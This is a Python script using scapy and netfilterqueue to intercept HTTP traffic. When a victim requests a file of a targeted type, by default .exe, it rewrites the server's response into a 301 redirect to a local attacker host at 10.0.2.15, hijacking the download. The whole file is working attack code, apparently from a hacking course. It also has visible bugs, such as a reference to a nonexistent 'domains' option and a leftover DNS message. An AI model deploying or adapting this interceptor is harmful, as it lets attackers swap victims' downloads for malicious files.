from scapy.all import IP, TCP, Raw, IP
from argparse import ArgumentParser, ArgumentError
from netfilterqueue import NetfilterQueue, Packet
from typing import NamedTuple, Union, Optional, Tuple, List

class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    targets: tuple
    verbose: bool

acks: List[int] = []

def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options.
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-t', '--targets', dest='targets', help='A comma delimited list of file types to target. The script will default to exe''s if no list is provided')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        options = parser.parse_args()
        if not options.targets:
            options.targets = tuple(['exe'])
        else:
            options.targets = tuple(options.domains.split(','))
        if not options.verbose:
            options.verbose = False
        return Options(options.targets, options.verbose)
    except ArgumentError as e:
        error('An error occurred while parsing input arguments.')
    return Options((), False)

def update_load(packet: 'Packet', new_load) -> 'Packet':
    '''
    Replaces the load of a given packet with new_load.
    '''
    packet[Raw].load = new_load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def proc_packet(packet: 'Packet') -> None:
    '''
    Consumes a given packet. Injects a desired payload into the packet's load when a request for a 
    file is detected of a target type.
    '''
    global config
    ip = IP(packet.get_payload())
    if ip.haslayer(Raw):
        load = str(ip[Raw].load)
        if ip.haslayer(TCP):
            if ip[TCP].dport == 80:
                for filetype in config.targets:
                    if f'.{filetype}' in load:
                        print('[+] target filetype detected')
                        acks.append(ip[TCP].ack)
                    break
            if ip[TCP].sport == 80:
                if ip[TCP].seq in acks:
                    acks.remove(ip[TCP].seq)
                    print('[+] Redirecting file request')
                    new_load = update_load(ip, f'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15\n\n')
                    packet.set_payload(bytes(new_load))
    packet.accept()



def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting
    '''
    print(f'[-] {msg} Exiting...')
    exit()

def main(*args, **kwargs) -> None:
    global config
    config = get_args()
    try:
        queue = NetfilterQueue()
        queue.bind(0, proc_packet)
        print('[+] Waiting for dns requests...')
        queue.run()
    except (KeyboardInterrupt, InterruptedError):
        print('\n[+] Detected interrupt. Exiting...')

if __name__ == "__main__":
    main()